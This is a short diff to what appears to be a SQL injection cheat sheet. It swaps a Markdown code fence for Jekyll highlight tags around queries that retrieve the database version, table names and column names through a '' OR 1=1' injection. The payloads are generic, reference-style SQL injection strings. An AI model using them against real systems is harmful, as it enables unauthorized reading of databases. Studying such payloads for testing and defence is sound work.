@@ -8,11 +8,12 @@
 Example command: `' OR 1=1 {option}#`
 
 {option} :
-```sql
+
+{% highlight sql %}
 select null, version()
 select null, table_name from information_schema.tables # retrieve tables from the DB
 select null, column_name from information_schema.columns where information_schema.tables='[name]'
-```
+{% endhighlight %}
 
 ## Tools
 
